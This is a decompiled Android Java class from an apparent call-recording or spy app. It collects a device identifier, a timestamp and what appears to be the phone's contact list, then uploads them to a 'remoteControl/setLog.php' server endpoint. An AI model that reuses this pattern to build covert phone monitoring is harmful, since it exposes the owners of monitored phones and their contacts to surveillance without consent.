package com.yasoka.spcallrecord.recorder.call.a.c.a;

import a.c.e.e;
import android.content.Context;
import com.app.action.a;
import com.app.activity.MyApp;
import java.util.HashMap;
import java.util.Map;

/* compiled from: GetListContacts */
public class c {

    /* renamed from: a reason: collision with root package name */
    private String f8a;

    /* renamed from: b reason: collision with root package name */
    private int f9b;

    public c(String str, int i) {
        this.f8a = str;
        this.f9b = i;
        String str2 = "";
        try {
            Context applicationContext = MyApp.b().getApplicationContext();
            String a2 = a.a(applicationContext);
            String b2 = a.c.j.c.b();
            HashMap hashMap = new HashMap();
            StringBuilder sb = new StringBuilder();
            sb.append(str2);
            sb.append(e.e(applicationContext));
            hashMap.put("idPhone", sb.toString());
            hashMap.put("dateConnexion", b2);
            hashMap.put("type", this.f8a);
            StringBuilder sb2 = new StringBuilder();
            sb2.append(str2);
            sb2.append(this.f9b);
            hashMap.put("idLog", sb2.toString());
            hashMap.put("data", a2);
            long a3 = a.a.a(e.e(applicationContext), b2, this.f8a, this.f9b, a2, applicationContext);
            if (a.c.e.a.b("remoteControl/setLog.php", (Map<String, String>) hashMap)) {
                a.a.d((int) a3, applicationContext);
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
    }
}
